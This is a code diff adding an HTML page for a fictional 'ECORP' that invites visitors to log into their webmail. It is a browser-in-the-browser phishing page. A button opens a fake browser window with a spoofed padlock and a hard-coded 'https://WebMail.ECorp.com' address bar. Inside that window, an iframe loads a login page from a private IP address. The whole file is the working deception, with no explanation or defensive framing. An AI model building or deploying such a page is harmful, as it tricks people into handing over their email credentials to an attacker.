@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" href="style.css">
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+	<title>Welcome To ECORP Official Website!</title>
+</head>
+
+<script>
+	function myFunction() {
+		var x = document.getElementById("window");
+		x.style.alignSelf == parent
+;		if (x.style.display === "none") {
+		  x.style.display = "block";
+		} else {
+		  x.style.display = "none";
+		}
+
+	  }
+
+	</script>
+
+<body>
+
+	
+	<h1>Hi Everyone! We at ECORP are bringing you with the most secure way to log into your WebMails.</h1>
+
+	<h2>Appreicate if you try it and give feedback by logging into your WebMails accounts securely!</h2>
+
+	<p>Or click below, to log in securely and provide feedback!</p>
+
+	<button onclick="myFunction()">Securely Log In!</button>
+
+<div id="window">
+<!-- Title bar start -->
+<div id="title-bar-width">
+	<div id="title-bar" class="outer yosemite">
+		<span class="dots">
+	     <div id="exit" class="dot red"></div>
+	     <div id="minimize" class="dot amber"></div>
+	     <div id="maximize" class="dot green"></div>
+	    </span>
+
+	     <span id="logo-description"></span>
+	</div>
+	<div id="url-bar">
+		<img src="./ssl.svg" width="20px" height="20px" id="ssl-padlock">
+		<span id="domain-name">https://WebMail.ECorp.com</span>
+		<span id="domain-path"></span>
+	</div>
+</div>
+
+
+<!-- Content start -->
+<iframe id="content" src="http://192.168.147.3/index2.html" frameBorder="0" allowfullscreen ></iframe>
+</div>
+</body>
+<script src="script.js"></script>
+</html>
+
+
